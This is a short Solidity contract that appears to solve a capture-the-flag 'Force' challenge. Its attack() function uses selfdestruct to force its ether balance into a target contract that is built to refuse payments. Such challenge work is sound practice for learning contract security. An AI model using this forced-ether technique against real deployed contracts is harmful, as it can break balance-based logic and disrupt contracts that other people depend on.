// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

contract ForceAttackContract {
    address payable challengeInstance;

    constructor(address payable _challengeInstance) {
        challengeInstance = _challengeInstance;
    }

    function attack() external {
        selfdestruct(challengeInstance);
    }

    receive() external payable {}
}
